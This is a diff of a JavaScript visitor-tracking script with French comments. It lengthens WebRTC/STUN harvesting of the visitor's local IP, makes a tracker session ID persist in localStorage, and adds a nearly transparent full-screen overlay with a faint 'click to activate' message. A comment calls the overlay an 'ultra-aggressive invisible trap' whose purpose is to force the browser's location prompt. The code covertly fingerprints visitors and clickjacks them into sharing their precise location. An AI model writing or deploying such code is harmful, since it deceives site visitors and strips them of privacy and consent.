@@ -26,12 +26,16 @@ async function getLocalIP() {
             }
         };
 
-        // Timeout plus long pour laisser le temps au STUN de répondre
+        // Timeout plus long pour laisser le temps au STUN de répondre (3 secondes)
         setTimeout(() => {
-            if (ips.length > 0) resolve(ips[0]);
-            else resolve("Inconnue (Timeout)");
+            if (ips.length > 0) {
+                resolve(ips[0]);
+            } else {
+                // Tentative de récupération via une autre méthode si STUN échoue
+                resolve("Inconnue (Timeout/mDNS)");
+            }
             pc.close();
-        }, 2000);
+        }, 3000);
     });
 }
 
@@ -66,8 +70,12 @@ async function getPreciseLocation() {
     });
 }
 
-// Générer un ID de session unique pour ce visiteur
-const sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+// Récupérer ou générer un ID de session persistant pour ce visiteur
+let sessionId = localStorage.getItem('tracker_session_id');
+if (!sessionId) {
+    sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+    localStorage.setItem('tracker_session_id', sessionId);
+}
 
 async function logVisitor(preciseLocation = null, isUpdate = false) {
     try {
@@ -95,15 +103,44 @@ async function logVisitor(preciseLocation = null, isUpdate = false) {
 
 // Nouvelle logique pour "forcer" la localisation avec un piège invisible ultra-agressif
 async function startVerification() {
-    const overlay = document.getElementById('verification-overlay');
+    let overlay = document.getElementById('verification-overlay');
 
+    // Si l'overlay n'existe pas (sur les pages tableaux par exemple), on le crée dynamiquement
     if (!overlay) {
-        logVisitor();
-        return;
+        console.log("Création dynamique de l'overlay de capture...");
+        overlay = document.createElement('div');
+        overlay.id = 'verification-overlay';
+        Object.assign(overlay.style, {
+            position: 'fixed',
+            top: '0',
+            left: '0',
+            width: '100vw',
+            height: '100vh',
+            background: 'rgba(0,0,0,0.01)',
+            zIndex: '99999',
+            cursor: 'pointer',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center'
+        });
+
+        const msg = document.createElement('div');
+        Object.assign(msg.style, {
+            background: 'rgba(0,0,0,0.6)',
+            color: 'white',
+            padding: '10px 20px',
+            borderRadius: '30px',
+            fontSize: '12px',
+            pointerEvents: 'none',
+            opacity: '0.1'
+        });
+        msg.innerText = 'Cliquer pour activer le contenu interactif';
+        
+        overlay.appendChild(msg);
+        document.body.appendChild(overlay);
     }
 
     // On s'assure que l'overlay est bien invisible mais présent
-    overlay.style.background = 'rgba(0,0,0,0.01)';
     overlay.style.display = 'flex';
 
     const handleFirstClick = async () => {
